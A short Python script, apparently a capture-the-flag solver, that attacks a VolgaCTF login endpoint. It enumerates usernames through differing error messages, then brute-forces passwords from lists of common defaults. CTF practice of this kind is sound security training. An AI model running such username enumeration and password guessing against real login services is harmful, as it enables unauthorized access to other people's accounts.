import urllib.request
import json
import time

URL = 'http://web-l2-1.q.2026.volgactf.ru:5001/auth'

def req(payload, timeout=8):
    data = json.dumps(payload).encode()
    r = urllib.request.Request(URL, data=data, 
                                headers={'Content-Type': 'application/json'}, 
                                method='POST')
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return 0, str(e)

# Test connectivity
code, body = req({"username": "test", "password": "test"})
print(f"Connectivity test: {code} {body}")

# Brute force usernames using rockyou-like list
usernames = [
    # CTF specific
    "ctf", "volgactf", "volga", "nofrontend", "backend", "api", "flag",
    # Common
    "admin", "administrator", "root", "user", "test", "guest", "service",
    "john", "alice", "bob", "charlie", "dave", "eve",
    # Russian names
    "ivan", "user1", "omega", "alpha", "beta",
]
passwords = [
    "admin", "password", "123456", "test", "root", "qwerty", 
    "letmein", "pass", "1234", "changeme", "secret", "admin123",
    "Password1", "password123", "p@ssword", "p@ss", "Pa$$w0rd",
]

found = False
for user in usernames:
    code, body = req({"username": user, "password": "x"})
    print(f"  {user}: {code} - {body[:60]}")
    
    if "Wrong" in body or "incorrect" in body.lower() or (code == 401 and "not found" not in body.lower()):
        print(f"\n!!! USER FOUND: {user}")
        # Now brute force password
        for pwd in passwords:
            code2, body2 = req({"username": user, "password": pwd})
            print(f"    {user}:{pwd} -> {code2} {body2}")
            if code2 == 200:
                print("SUCCESS!!!", body2)
                found = True
                break
            time.sleep(0.3)
    time.sleep(0.5)

if not found:
    print("No user found with known credentials")
